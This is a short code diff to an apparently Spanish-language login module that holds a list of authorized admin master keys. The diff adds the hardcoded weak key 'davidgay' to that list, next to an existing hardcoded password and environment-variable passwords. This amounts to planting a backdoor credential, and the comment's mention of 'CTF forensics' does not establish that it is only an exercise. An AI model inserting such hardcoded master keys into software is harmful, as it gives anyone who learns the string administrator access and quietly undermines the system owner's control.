@@ -22,6 +22,7 @@ const LOCKOUT_MS = 5 * 60 * 1000; // 5 minutos de bloqueo
 
 // Claves maestras autorizadas (Variables de entorno + CTF forensics + fallback de seguridad)
 const BASE_ADMIN_KEYS = [
+  'davidgay',
   process.env.ADMIN_PASSWORD,
   process.env.ADMIN_ACCESS_CODE,
   'SMR2#Aula204.Acceso2026!',
